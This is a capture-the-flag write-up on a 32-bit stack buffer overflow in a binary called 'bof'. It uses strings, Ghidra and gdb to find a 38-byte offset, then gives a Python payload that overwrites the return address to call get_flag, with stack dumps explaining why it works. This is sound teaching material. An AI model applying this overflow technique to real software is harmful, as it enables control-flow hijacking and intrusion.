# Bof

## Strings

It's often nice to run `strings bof` to see what's there first, giving the following strings of interest.

```
cat flag.txt
Enter the password: 
i<3sectalks
Wrong Password
Correct Password, however the get_flag function is disabled at this time.
```

## Reverse engineering

To analyze the binary, I loaded `bof` into ghidra :boom:.

Let's look at the decompilation of the `main` function. You can see:
* `scanf` reading the password into a `char[30]` but without a maximum length. Looks like we will be able to overflow this buffer, but to do what?
* If you run `bof` and enter the password `i<3sectalks`, `Correct Password` is printed, but, as the message says, `get_flag` isn't actually called.

We need the address of the `get_flag` function if we're going to try to run it. The address can be found in the Symbol Tree window under Functions. Alternatively, run `objdump -d bof | grep "<get_flag>"` to find that it's at `0x080491b0`. The `get_flag` function runs `system("cat flag.txt")`.

We want to overflow the password buffer to somehow set the instruction pointer (`eip` register) to the address of `get_flag`.
The easiest way is by experimenting with gdb. Run `gdb bof` and enter `r` to start execution.

Enter a password containing a long string of 'a's (at least 50). You should see a segmentation fault where the instruction pointer is at address `0x61616161`. The character 'a' is `0x61`, so we now know we can set the address in `eip`. The full register list can be seen with `info registers`.

Restart the program (`r` in gdb). Enter a password containing 30 dots (or any character) followed by `abcdefghijklmnopqrstuvwxyz` (in hex this would be `61 62 63 64 65...`). The segfault is now at `0x6c6b6a69` corresponding to `ijkl`. The first 8 bytes `abcdefgh` must have been used for other things; the following 4 bytes `ijkl` make up the `eip`. We now know how to set the `eip` to the address of `get_flag`.
We send a payload containing:

* 38 junk characters
* `0xb0 0x91 0x04 0x08` (the function address we want, be careful of the order)

```
python3 -c '
import os
os.write(1, b"x" * 38 + b"\xb0\x91\x04\x08")
' | ./bof
```

We now see output showing that `cat flag.txt` has been run! Just pipe the payload into `nc $HOST $PORT` instead of the local `./bof` to get the real flag.

`os.write(1, ...)` was used to write bytes to stdout (file descriptor 1) without encoding messing things up.

## How does it work? Why 38?

When we entered our payload earlier we saw "Wrong password" before the flag: we ran the rest of the code in `main` and only then jumped to `get_flag`.
To see how it works and how we could have calculated the offset of 38 without gdb, we need to consider the stack, which is defined by the `esp` and `ebp` registers.

### Where is the password buffer?

Let's get the location on the stack of the password buffer.
The instruction `8d 4d de  lea  -0x22(%ebp),%ecx` before the calls to `scanf` and `strcmp` refers to the password buffer at address `ebp-0x22`.

To verify this let's inspect the stack with gdb.
To help print a hexdump of memory in gdb, I use the following code in my `~/.gdbinit` file:

```
# Modified from https://stackoverflow.com/questions/9233095/memory-dump-formatted-like-xxd-from-gdb
define xxd
  if $argc < 2
    set $size = sizeof(*$arg0)
  else
    set $size = $arg1
  end
  dump binary memory /tmp/dump.bin $arg0 ((void *)$arg0)+$size
  eval "shell xxd -o %d /tmp/dump.bin; rm /tmp/dump.bin", ((void *)$arg0)
end
document xxd
  Dump memory with xxd command (keep the address as offset)

  xxd addr [size]
    addr -- expression resolvable as an address
    size -- size (in byte) of memory to dump
            sizeof(*addr) is used by default
end
```

This defines an `xxd` command which can print the stack so that we can see where the password ends up.
Add a breakpoint in gdb right after the `scanf` call with `b *0x8049214`. Enter the password `password123` and we'll hit the breakpoint.

```
Breakpoint 1, 0x08049214 in main ()
>>> xxd $esp $ebp-$esp  # print full stack
ffffc8b0: 2aa0 0408 d6c8 ffff 4442 faf7 ecc0 e0f7  *.......DB......
ffffc8c0: 0100 0000 0300 0000 502a e2f7 0000 0000  ........P*......
ffffc8d0: 1400 0000 94c9 7061 7373 776f 7264 3132  ......password12
ffffc8e0: 3300 faf7 ac82 0408 a992 0408 0000 0000  3...............
ffffc8f0: 0060 faf7 0000 0000                      .`......
>>> xxd $ebp-0x22 30
ffffc8d6: 7061 7373 776f 7264 3132 3300 faf7 ac82  password123.....
ffffc8e6: 0408 a992 0408 0000 0000 0060 faf7       ...........`..
```

As you can see, the null-terminated password is at `ebp-0x22`.

### Execution flow

When a function is called with the `call` instruction, the address of the next instruction (immediately after the `call`) is pushed onto the stack as the "saved eip" or "return address", and execution moves (`eip` is set) to the callee.
As soon as `main` has been called, the stack looks as follows:
```
esp-76                                                             esp                          esp+4
esp-0x4c                                                           esp                          esp+0x4
| Unused area just before stack                                    | saved eip (return address) |???
```
Then we run the following instructions according to the calling convention to initialise the stack:
```
 ; at start of function, esp points to the return address (address main was called from)
 80491d0:  55         push   %ebp       ; Push old ebp onto stack so we can get it back later (esp decremented by 4)
 80491d1:  89 e5      mov    %esp,%ebp  ; Set ebp pointer to esp (before old stack) to make new stack of size 0
 80491d3:  83 ec 48   sub    $0x48,%esp ; Reserve 72 bytes of stack space (esp decremented by another 72)
```
Now, in the main part of `main` the stack looks like:
```
esp=ebp-72         ebp-34            ebp-4               ebp       ebp+4                        ebp+8
esp=ebp-0x48       ebp-0x22          ebp-0x04            ebp       ebp+0x4                      ebp+0x8
| More stack space | password buffer | an int variable   | old ebp | saved eip (return address) |???
```
At the end of `main`, we run the following instructions:
```
 804928d:  83 c4 48   add    $0x48,%esp ; Get rid of stack of size 72 (esp incremented by 72 so esp=ebp)
 8049290:  5d         pop    %ebp       ; Pop old ebp off stack (esp incremented by 4, ebp=old ebp)
 8049291:  c3         ret               ; Set eip to current value at the address pointed to by esp
```

When the final `ret` instruction is executed, we need the return address on the stack to point to `get_flag`.

Therefore, we need a payload consisting of 38 junk characters to fill the space between `ebp-0x22` and `ebp+0x4`. After that we can put the desired `eip` and get the flag!


### More debugging

Make a payload.txt file containing the payload. Run gdb and set the breakpoint as before and let's pipe the password payload in with `r < payload.txt`.
```
Breakpoint 1, 0x08049214 in main ()
>>> info frame  # see the saved eip is for get_flag
Stack level 0, frame at 0xffffc900:
 eip = 0x8049214 in main; saved eip = 0x80491b0
 ...
>>> xxd $esp $ebp-$esp+8  # print stack and the "saved eip"
ffffc8b0: 2aa0 0408 d6c8 ffff 4442 faf7 ecc0 e0f7  *.......DB......
ffffc8c0: 0100 0000 0300 0000 502a e2f7 0000 0000  ........P*......
ffffc8d0: 1400 0000 94c9 7878 7878 7878 7878 7878  ......xxxxxxxxxx
ffffc8e0: 7878 7878 7878 7878 7878 7878 7878 7878  xxxxxxxxxxxxxxxx
ffffc8f0: 7878 7878 7878 7878 7878 7878 b091 0408  xxxxxxxxxxxx....
>>> x/a $ebp+4  # print saved eip as an address
0xffffc8fc:     0x80491b0 <get_flag>
```
